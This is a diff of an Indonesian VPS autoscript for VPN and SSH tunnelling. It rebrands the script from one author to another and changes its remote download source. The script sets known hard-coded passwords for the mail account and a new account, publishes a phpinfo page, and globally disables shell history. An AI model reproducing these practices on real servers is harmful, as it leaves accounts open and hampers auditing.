@@ -30,7 +30,7 @@ vps="blangkon";
 #if [[ $vps = "zvur" ]]; then
 	#source="http://"
 #else
-	source="https://raw.githubusercontent.com/yusuf-ardiansyah/y"
+	source="https://raw.githubusercontent.com/Boedaxbayah-vpn/boedaxbayah"
 #fi
 
 # go to root
@@ -41,9 +41,9 @@ wget -q -O IP $source/debian7/IP.txt
 if ! grep -w -q $MYIP IP; then
 	echo "Maaf, hanya IP yang terdaftar yang bisa menggunakan script ini!"
 	if [[ $vps = "zvur" ]]; then
-		echo "Hubungi: editor YUSUF-ARDIANSYAH atau (082139743432)"
+		echo "Hubungi: editor Boedaxbayah"
 	else
-		echo "Hubungi: editor YUSUF-ARDIANSYAH atau (082139743432)"
+		echo "Hubungi: editor Boedaxbayah"
 	fi
 	rm /root/IP
 	rm -f /root/IP
@@ -134,7 +134,7 @@ rm /etc/nginx/sites-enabled/default
 rm /etc/nginx/sites-available/default
 wget -O /etc/nginx/nginx.conf $source/debian7/nginx.conf
 mkdir -p /home/vps/public_html
-echo "<pre>Modified by YUSUF-ARDIANSYAH atau (082139743432)</pre>" > /home/vps/public_html/index.html
+echo "<pre>Modified by Boedaxbayah</pre>" > /home/vps/public_html/index.html
 echo "<?php phpinfo(); ?>" > /home/vps/public_html/info.php
 wget -O /etc/nginx/conf.d/vps.conf $source/debian7/vps.conf
 sed -i 's/listen = \/var\/run\/php5-fpm.sock/listen = 127.0.0.1:9000/g' /etc/php5/fpm/pool.d/www.conf
@@ -382,9 +382,9 @@ chmod +x ovpn.sh
 rm ./ovpn.sh
 
 usermod -s /bin/false mail
-echo "mail:ardy" | chpasswd
+echo "mail:ndr" | chpasswd
 useradd -s /bin/false -M YUSUF-ARDIANSYAH
-echo "YUSUF-ARDIANSYAH:ardy" | chpasswd
+echo "boedaxbayah:ndr" | chpasswd
 # finishing
 chown -R www-data:www-data /home/vps/public_html
 service cron restart
@@ -404,7 +404,7 @@ echo "unset HISTFILE" >> /etc/profile
 
 # info
 clear
-echo "Autoscript Edited BY YUSUF-ARDIANSYAH atau (082139743432):" | tee log-install.txt
+echo "Autoscript Edited BY Boedaxbayah:" | tee log-install.txt
 echo "=======================================================" | tee -a log-install.txt
 echo "Service :" | tee -a log-install.txt
 echo "---------" | tee -a log-install.txt
@@ -439,19 +439,19 @@ echo "Auto Reboot tiap jam 00:00 dan jam 12:00" | tee -a log-install.txt
 echo "" | tee -a log-install.txt
 
 if [[ $vps = "zvur" ]]; then
-	echo "ALL SUPPORTED BY CLIENT VPS" | tee -a log-install.txt
+	echo "Boedaxbayah" | tee -a log-install.txt
 else
-	echo "ALL SUPPORTED BY TEAM HACKER" | tee -a log-install.txt
+	echo "Boedaxbayah" | tee -a log-install.txt
 	
 fi
-echo "Credit to all developers script, YUSUF-ARDIANSYAH" | tee -a log-install.txt
+echo "Credit to all developers script, Boedaxbayah" | tee -a log-install.txt
 echo "" | tee -a log-install.txt
 echo "Log Instalasi --> /root/log-install.txt" | tee -a log-install.txt
 echo "" | tee -a log-install.txt
 echo " !!! SILAHKAN REBOOT VPS ANDA !!!" | tee -a log-install.txt
 echo "=======================================================" | tee -a log-install.txt
 cd ~/
-rm -f /root/z7.sh
+rm -f /root/B7.sh
 rm -f /root/pptp.sh
 rm -f /root/ovpn.sh
 rm -f /root/dropbear-2012.55.tar.bz2
